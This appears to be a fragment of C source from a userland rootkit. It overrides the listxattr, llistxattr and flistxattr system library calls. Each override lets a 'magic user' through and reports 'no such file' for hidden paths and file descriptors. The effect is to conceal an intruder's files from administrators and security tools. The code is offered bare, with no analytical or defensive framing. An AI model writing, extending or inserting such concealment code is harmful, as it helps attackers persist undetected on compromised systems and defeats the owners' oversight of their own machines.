ssize_t listxattr(const char *path, char *list, size_t size){
    hook(CLISTXATTR);
    if(magicusr()) return (ssize_t)call(CLISTXATTR, path, list, size);
    if(hidden_path(path)) { errno = ENOENT; return -1; }
    return (ssize_t)call(CLISTXATTR, path, list, size);
}

ssize_t llistxattr(const char *path, char *list, size_t size){
    hook(CLLISTXATTR);
    if(magicusr()) return (ssize_t)call(CLLISTXATTR, path, list, size);
    if(hidden_path(path)) { errno = ENOENT; return -1; }
    return (ssize_t)call(CLLISTXATTR, path, list, size);
}

ssize_t flistxattr(int fd, char *list, size_t size){
    hook(CFLISTXATTR);
    if(magicusr()) return (ssize_t)call(CFLISTXATTR, fd, list, size);
    if(hidden_fd(fd)) { errno = ENOENT; return -1; }
    return (ssize_t)call(CFLISTXATTR, fd, list, size);
}